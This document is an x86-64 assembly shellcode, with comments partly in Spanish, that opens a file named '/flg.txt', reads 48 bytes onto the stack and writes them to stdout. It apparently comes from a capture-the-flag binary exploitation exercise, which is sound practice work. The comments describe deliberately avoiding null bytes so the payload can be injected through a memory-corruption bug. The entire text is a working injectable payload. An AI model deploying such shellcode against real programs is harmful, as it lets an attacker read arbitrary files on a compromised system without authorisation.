section .text
_start:
    ; push './flg.txt\x00'
    mov rax, 0x7478742e676c662f  ; "/flg.txt" en reversa
    push rax                     ; Push en la pila
    mov rdi, rsp                 ; move pointer to filename

    ; open('rsp', 'O_RDONLY')
    mov al, 2                    ; open syscall number
    cdq                          ; limpia rdx (evita NULL bytes)
    syscall

    ; read file
    mov rsi, rsp                 ; buffer en la pila
    mov dl, 0x30                 ; tamaño a leer
    xchg eax, edi                ; fd en edi sin NULL bytes
    xor eax, eax                 ; read syscall number
    syscall

    ; write output
    mov al, 1                    ; write syscall
    mov dil, 1                   ; fd = stdout sin NULL bytes
    syscall

    ; exit
    mov al, 60                   ; exit syscall
    syscall